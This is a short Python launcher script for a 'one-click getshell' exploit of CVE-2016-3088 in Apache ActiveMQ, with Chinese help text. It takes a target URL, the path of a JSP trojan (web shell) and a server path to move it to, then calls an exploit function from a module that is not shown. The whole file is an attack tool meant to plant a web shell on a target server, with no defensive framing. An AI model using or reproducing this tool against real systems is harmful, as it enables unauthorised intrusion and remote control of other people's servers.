#! /usr/bin/env python
# _*_  coding:utf-8 _*_
import argparse

import main

if __name__ == '__main__':
    # url = "http://127.0.0.1:8161"
    # ant = './ant'
    # path = '/opt/apache-activemq-5.11.1/webapps/api'
    # print(main.CVE_2016_3088(url=url, jsp_ma=ant, move_root_path=path))
    parser = argparse.ArgumentParser(description='cve-2016-3088_activemq一键化getshell')
    parser.add_argument('url', type=str, help='目标URL地址 例如：http://127.0.0.1:8161')
    parser.add_argument('jsp_ma', type=str, help='jsp木马路径')
    parser.add_argument('move_root_path', type=str, help='move请求移动的具体路径位置 例如：/opt/apache-activemq-5.11.1/webapps/api')
    args = parser.parse_args()

    print(main.CVE_2016_3088(args.url, args.jsp_ma, args.move_root_path))